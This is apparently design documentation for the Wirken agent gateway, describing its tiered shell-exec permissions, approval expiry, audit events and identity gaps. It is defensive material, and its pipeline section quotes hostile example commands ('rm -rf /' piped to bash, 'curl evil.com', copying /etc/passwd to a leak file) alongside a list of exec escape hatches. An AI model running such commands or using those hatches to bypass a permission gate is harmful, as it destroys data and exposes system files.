# Permissions and Identity

How Wirken maps platform user identity to authorization decisions. This doc is split into two sections: **What exists today** describes current code behavior, **Planned** describes the intended direction that is not yet implemented.

If you are deploying Wirken for a team, read both sections before designing your authorization model. The gap between them is load-bearing.

## What exists today

### Three-tier permission model, scoped per agent

Every tool action falls into one of three tiers:

- **Tier 1, always allowed.** Workspace file access, channel converse, web search.
- **Tier 2, first-use approval with a 30-day expiry.** External file access (per path), cross-conversation message, and a small curated allowlist of shell-inspection verbs (see below). Everything else that would have been Tier 2 under a denylist model is Tier 3 instead.
- **Tier 3, always prompt.** Destructive file operations, network requests (per domain), credential access, cron create, skill install, and every shell verb outside the Tier 2 allowlist.

### Shell exec allowlist

Shell exec is Tier 2 only for verbs on an explicit allowlist:

```
ls cat head tail grep diff cmp stat file wc tree
readlink realpath basename dirname
pwd whoami id uname hostname date echo printf which type
```

Every verb is pure inspection, identity, or path math with no documented exec escape hatch. Every other exec prefix is Tier 3 and prompts on each invocation. That includes shell wrappers (`sh`, `bash`, `env`, `xargs`, ...), language interpreters that can eval (`python -c`, `node -e`, `perl -e`, `ruby -e`, `lua`, `awk`, `sed` with GNU `s///e`), build / deploy tools (`make`, `cargo`, `docker`, `kubectl`, `git`), and exec-hatch-bearing inspection tools (`rg --pre`, `sort --compress-program`, `find -exec`, `less`/`more`/`man` via `!` and `$PAGER`).

The allowlist is curated in `crates/gateway/src/permissions.rs::TIER2_ALLOWLIST`. Adding a verb requires reviewing its man page for exec escapes of the kinds listed above.

Matching is on the canonical form of the first whitespace token: `/usr/bin/ls`, `./ls`, and `LS` all match `ls`.

### Pipeline / chain laundering

Token-prefix matching alone would let an allowlisted lead verb hand control to a non-allowlisted one downstream of the tier check: `echo "rm -rf /" | bash`, `pwd && curl evil.com`, `cat /etc/passwd > /tmp/leak`, or any multi-line command body fed to a shell. Before tier classification, `tool_to_action` scans the raw command for shell metacharacters (`| ; & $( ` `` ` ` `` ` > < \n`); any presence forces a sentinel pattern (`:pipeline:`) that cannot match the allowlist, so the action lands on Tier 3 and prompts on every invocation. `&&`, `||`, `>>`, `<<` are covered by their single-character prefixes.

Edge case not handled here: a bare shell binary as argv (`bash` alone, no metacharacters, no script argument) executes whatever stdin is piped to it. argv-only inspection cannot see the stdin source. In practice the producer would itself contain a metacharacter and be caught by this list; pure argv-only `bash` with externally-attached stdin is not a shape the agent can produce through `exec`.

### Where approvals live

Approvals are stored in `~/.wirken/permissions.db` keyed on `(action_key, agent_id)`. The `action_key` for a shell exec is the canonicalized prefix — `ShellExec { pattern: "ls -la /" }` stores `shell:ls`. The argument tail is not part of the key; a single `shell:ls` approval applies to every later `ls`-prefixed invocation until its window closes.

On upgrade from pre-allowlist versions, `PermissionStore::open` prunes any stored `shell:<prefix>` rows whose prefix is no longer Tier 2 eligible (e.g., `shell:git`, `shell:kubectl`, `shell:make`). Operators see a single log line at startup enumerating what was dropped. The gate would have ignored those rows anyway; the prune keeps `wirken permission list` honest.

`wirken permission list --agent work` prints all approvals for an agent. `wirken permission revoke <key> --agent work` removes one.

### Only Tier 2 keys can be stored

`permissions.db` accepts a grant only for an action key that is Tier 2: a shell verb on the Tier 2 allowlist, `file:<path>`, or `cross-conversation`. Every other key is refused at write time.

Tier 3 keys are refused because the gate answers Tier 3 without consulting storage at all, so a stored row would never be read while still listing in `wirken permission list` as though the operator had pre-approved something. Tier 1 keys are refused for the mirror reason: Tier 1 is allowed without a lookup, so the row is equally inert.

The rule is an allowlist of storable shapes rather than a denylist of unstorable ones. A key namespace added later is refused until it is named here deliberately.

### Grant expiry

A persisted grant carries an `expires_at`. When the gate reads a grant whose window has closed it drops the row and falls back to prompting, and the action stays at prompt-on-every-call until the operator grants it again.

**Expiry is observed, not scheduled.** Nothing runs at the moment a window closes. A lapse is noticed at one of two points: the next call that consults the grant, or the next time the store is opened, which sweeps lapsed rows (see below). A grant on a key nothing calls, in a `wirken run` daemon that stays up for a week, lapses on paper and is noticed when that daemon restarts. Do not read `PermissionGrantExpired` timestamps as a schedule of when grants ended; read `expired_at` on the row for that, and the row's own `ts` for when it was noticed. The `detected_by` field says which of the two points did the noticing.

The default window is 30 days. To change it, set `default_expiry_days` in `~/.wirken/permissions.json`:

```json
{ "default_expiry_days": 7 }
```

An unreadable, unparseable, or absent file means 30 days, and an unrecognised key is named in a warning and ignored rather than failing startup. A single grant can override the default in either direction:

```
wirken permissions approve shell:ls --agent work --expires-in-days 1
```

The default is what an operator gets when they say nothing, not a ceiling on what they can ask for. Zero days is refused at both levels: it stores a grant that has already expired by the time the gate reads it, which reads as a live grant in `wirken permissions list` while prompting on every call. To stop granting an action, revoke it.

`--expires-in-days` does not apply to `--session` grants and is refused alongside it: a session-scoped grant is cleared on session end, not on a date.

### Rows an upgrade leaves behind

The Tier 2 rule above governs writes. It does nothing about rows already in `permissions.db`, and there are two kinds worth removing:

- Keys that are not storable under the current tier model. Older builds accepted `mcp:`, `tool:`, `wasm:`, `imported_chat:`, `imported_search:` and `imported_search_corpus`, and the Tier 2 flip from a denylist to an allowlist stranded `shell:git`, `shell:kubectl`, `shell:make` and the language interpreters. None of these were ever read by the gate.
- Grants whose window closed with nothing having called them. `check` only drops a lapsed row when something consults it, so a grant on an unused key stays in the table indefinitely.

Both printed in `wirken permissions list` as though they were grants, which is a false floor: the list overstated what was approved.

`PermissionStore::open` sweeps both, so the table is honest from the moment it opens rather than from the first call that happens to touch each key. Each removal gets an audit row (`PermissionGrantPruned` or `PermissionGrantExpired`, see below), and the CLI prints a one-line summary when a sweep removed anything. The sweep is idempotent; a second open reports nothing.

### What the chain records about a grant

Five events, so a reviewer can tell five different situations apart.

| Event | Means |
| --- | --- |
| `PermissionApproved` | A grant was written where none existed. |
| `PermissionRenewed` | A grant was written over one that was already there. Carries `previous_expires_at` alongside `expires_at`. |
| `PermissionGrantExpired` | A grant was found lapsed and dropped. Carries the `expired_at` the row held. `detected_by: tool_call` means a call hit it, and the tool and tier are on the row; `detected_by: store_open` means the sweep found it, with no tool and no tier because no call was involved. |
| `PermissionGrantPruned` | A grant was dropped because its key is Tier 1 or Tier 3 and the gate could never read it. Nothing ran out. Sweep only. |
| `PermissionDenied` | The call was refused. |

The store keeps one row per key and renewal overwrites in place, so `previous_expires_at` on a renewal row is the only surviving record of the window that was discarded. A key granted once and renewed twenty times is otherwise indistinguishable from one granted yesterday.

`PermissionGrantExpired` is the row that separates "the operator granted this and the window ran out" from "the operator never granted this". Both reach the agent as the same prompt, and only one is worth investigating.

Operator grants made out of band of any conversation (`wirken permissions approve` without `--session`) are recorded under the `gateway-permissions` sentinel session, alongside the existing `gateway-hooks` and `gateway-mcp` lanes. They do not appear in `wirken sessions list`.

### Platform sender identity is audited, not authorized

Each channel adapter extracts the platform sender identity on every inbound message and forwards it to the gateway over the IPC frame:

- **Slack**: `user_id` (e.g., `U04ABCD9`).
- **Teams**: Bot Framework activity sender id. The `tenant_id` is also captured in the message metadata JSON.
- **Matrix**: MXID (e.g., `@alice:matrix.example.com`).

The gateway writes this to the audit log as the `actor` field of the `message.inbound` event. The full event carries actor, action, target, channel, conversation id (as session), and a detail payload.

The sender id does not flow into the permission check. Permission lookups key on `(action_key, agent_id)` only. Consequence: **a Tier 2 approval granted when any user on a channel first triggers an action applies to every user on that channel until the approval expires.** If Alice first runs a `shell:terraform apply` pattern on Slack and approves it, Bob gets the same tool-call approval without being prompted, until that grant's window closes.

This is a real gap if the deployment uses one shared agent across a team. Workarounds today:

- Run separate agents per sensitive user and bind them to per-user conversations (requires manual routing, not intended as a primary model).
- Keep high-blast-radius actions at Tier 3 so every invocation prompts, regardless of prior approval.

### Sub-agent ceilings

When a parent agent is allowed to spawn a child via `spawn_subagent`, the parent's registration declares a `SubagentCeiling` per allowed child:

- `tool_allowlist`: child only sees tools in this list. Intersected with whatever the LLM passes in the spawn call. Anything outside is dropped.
- `max_permission_tier`: child's tools above this tier are auto-denied. No interactive approval flow (children run headless).
- `max_rounds`: max LLM rounds before the parent reports `rounds_exceeded`.
- `max_runtime_secs`: wall-clock timeout.

The LLM cannot widen these caps. The parent's harness intersects, clamps, and enforces. Configure via:

```bash
wirken agents allow-subagent parent child --tools "read_file,web_search" --max-tier tier1 --max-rounds 5 --max-runtime 30
```

The ceiling is stored as JSON in the `agents.allowed_subagents` column.

### Org-level tool policy

The pulled org config (`wirken setup --org <url>`) deserializes `permissions.allowed_tools`, `permissions.blocked_tools`, and `permissions.sandbox_mode` into `OrgPermissions`. All three are enforced:

- `sandbox_mode`. `apply_org_config` writes `sandbox.json` in the data directory; `wirken run` re-reads it on every gateway start. Valid values are `off`, `exec-only`, and `gvisor`; unknown values fall back to the default (`exec-only`) with a warning.
- `allowed_tools` and `blocked_tools`. Persisted to `tool_policy.json` in the data directory when at least one list is non-empty. `wirken run` loads the file and injects it into every waked agent. The check sits in `crates/agent/src/runtime.rs::execute_tool` ahead of the tier permission check: a call to a name in `blocked_tools` fails before dispatch; a call to a name not in `allowed_tools` fails before dispatch when `allowed_tools` is non-empty; `blocked_tools` wins when a name appears in both. Denials are written to the session log as `PermissionDenied` events with `denial_source: "org_policy"` (`tier` is null for these rows; the org-policy classification lives on `denial_source`, not `tier`).

### Channel process isolation

Each adapter runs in its own OS process with a distinct ed25519 IPC identity. A compromised adapter can only deliver inbound frames for its own channel and request outbound sends for its own channel. It cannot invoke tools directly, cannot read other channels' sessions through the IPC surface, and cannot request other channels' credentials through the IPC surface.

Process isolation is not credential ACL. The vault itself does not enforce per-process access: a process with access to `~/.wirken/vault.db` and the device key can retrieve any credential by name. The isolation is that adapters are spawned with a narrow retrieval pattern (only entries named `{channel}-*`) and run under the wirken daemon's boundary.

## Planned

These items are not implemented. They are documented here so deployers can plan around them. No timeline is promised.

### Per-user permission scoping

Permission approvals would key on `(action_key, agent_id, principal_id)`, where `principal_id` is a Wirken-internal identifier that the platform sender id resolves to. Alice approving `shell:kubectl *` would not approve it for Bob.

Open design questions: how the principal is named (platform id, an internal UUID, both), how a new sender on a channel is introduced, how revocation propagates.

### Per-channel scoping within an agent

Permission approvals would key on `(action_key, agent_id, channel)`. An agent bound to both `slack` and `matrix` would not have its Slack approvals leak to Matrix.

### Role-based access control

Named roles (`admin`, `approver`, `user`) with per-role tier caps. Admin users could approve Tier 3 actions on behalf of others without triggering an interactive prompt for every invocation.

### Platform-to-principal identity mapping

A configurable mapping from `(channel, platform_id)` to an internal principal. For example, `(slack, U04ABCD9)` and `(matrix, @alice:example.com)` both resolve to principal `alice`. Permissions and audit records would be attributed to `alice` across channels.

### Attestation workflow

`SessionEvent::Attestation` already carries an ed25519 signature over the per-session chain head. Two pieces are not yet in place: a CLI command to emit attestations on a schedule, and a documented external verifier workflow against a published signing key.

### IdP / SSO integration

Not planned in the short term. Wirken is not an IdP and is not intended to become one.
